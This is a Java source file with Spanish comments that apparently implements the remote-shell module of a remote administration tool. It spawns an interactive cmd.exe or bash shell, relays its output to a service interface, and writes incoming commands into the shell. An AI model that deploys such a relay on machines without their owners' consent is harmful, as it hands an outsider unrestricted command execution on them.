package rt.modulos.var;

import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.io.PrintWriter;
import java.util.Scanner;
import comunes.Interfaz;
import java.io.BufferedReader;
import rt.util.Protocolo;
import rt.util.UtilRT;

//consola
public class CMD {

    private Process p;//proceso
    private boolean a;//activo
    private Interfaz s;//servicio

    public CMD(Interfaz servicio) {
        this.s = servicio;
    }

    public void activar() {
        a = true;
        new Thread() {
            @Override
            public void run() {
                try {
                    ProcessBuilder builder = null;

                    if (UtilRT.isWindows()) {
                        builder = new ProcessBuilder("cmd.exe");
                    } else if (UtilRT.isLinux() || UtilRT.isSolaris() || UtilRT.isFREBSD() || UtilRT.isOpenBSD()) {
                        //builder = new ProcessBuilder("/bin/bash", "--login");
                        builder = new ProcessBuilder("/bin/bash", "-l", "-i");
//                        builder = new ProcessBuilder("/bin/bash",  "-i");
//                        builder = new ProcessBuilder("/bin/bash",  "-l");
//                        builder = new ProcessBuilder("sh", "-i");
                    } else {
                        return;
                    }
                    builder.redirectErrorStream(true);
                    p = builder.start();
                    a = true;
                    s.ejecutar(3, Protocolo.COMANDO_SHELL, "\nConsola activada\n");
                    final InputStream inStream = p.getInputStream();
                    new Thread(new Runnable() {
                        public void run() {

                            /*
                            METODO BETO
                             */
                            try {
                                int i;
                                byte[] buf = new byte[1];//voy leyendo de caracter en caracter
                                while ((i = inStream.read(buf)) > 0) {
                                    //out.write(buf, 0, i);
                                    s.ejecutar(3, Protocolo.COMANDO_SHELL, new String(buf));
                                }
                            } catch (Exception e) {

                            }

                            /*

                            //metodo encontrado para leer el stream del proceso
                                    InputStreamReader reader = new InputStreamReader(inStream);
                                                Scanner scan = new Scanner(reader);
                                                //leo linea entera
                                                //while (scan.hasNextLine() && a) {
                                                //  String salida = scan.nextLine();
                                                //  s.ejecutar(3, Protocolo.COMANDO_SHELL, salida + "\n");
                                                //}
                                                //----------------------------------------
                                                //leo caracter x caracter pero no vien ele fin de linea
                                                //----------------------------------------
                                                //while (scan.hasNext() && a) {
                                                //    String token = scan.next();
                                                //    s.ejecutar(3, Protocolo.COMANDO_SHELL, token);                    
                                                //}                             
                                                                    //----------------------------------------
                                                                    //leo linea a linea y caracter x caracter
                                                                    //----------------------------------------
                                        //                            while (scan.hasNextLine() && a) {
                                        //                                String line = scan.nextLine();
                                        //
                                        //                                Scanner lineScanner = new Scanner(line);
                                        //                                while (lineScanner.hasNext()) {
                                        //                                    String token = lineScanner.next();
                                        //                                    // do whatever needs to be done with token
                                        //                                    s.ejecutar(3, Protocolo.COMANDO_SHELL, token);
                                        //                                }
                                        //                                lineScanner.close();
                                        //                                // you're at the end of the line here. Do what you have to do.
                                        //                                s.ejecutar(3, Protocolo.COMANDO_SHELL, "\n");
                                        //                            }
                             */
                            s.ejecutar(3, Protocolo.COMANDO_SHELL, "\nConsola desactivada\n");
                            a = false;
                        }
                    }).start();

                } catch (Exception ex) {
                    a = false;
                }
            }
        }.start();
    }

    public void desactivar() {
        a = false;
        s.ejecutar(3, Protocolo.COMANDO_SHELL, "\nConsola desactivada\n");
    }
//public void escribirTecla(int keyCode) {
//        if (p != null) {
//            try {
//                OutputStream outStream = p.getOutputStream();
//                outStream.write(b);
//                PrintWriter pWriter = new PrintWriter(outStream);
//                pWriter.print(c);
//                pWriter.flush();
//            } catch (Exception e) {
////                e.printStackTrace();
//            }
//        }
//    }
    
    public void escribirCaracter(char c) {
        if (p != null) {
            try {
                OutputStream outStream = p.getOutputStream();
                PrintWriter pWriter = new PrintWriter(outStream);
                pWriter.print(c);
                pWriter.flush();
            } catch (Exception e) {
//                e.printStackTrace();
            }
        }
    }

    public void ejecutarComando(String entrada) {
        if (p != null) {
            try {
                OutputStream outStream = p.getOutputStream();
                PrintWriter pWriter = new PrintWriter(outStream);
                pWriter.println(entrada);
                pWriter.println();
                pWriter.flush();
//                pWriter.close();
            } catch (Exception e) {
//                e.printStackTrace();
            }
        }
    }

    public Process getProceso() {
        return p;
    }

    public void setProceso(Process proceso) {
        this.p = proceso;
    }

    public boolean isActivo() {
        return a;
    }

    public void setActivo(boolean activo) {
        this.a = activo;
    }

}
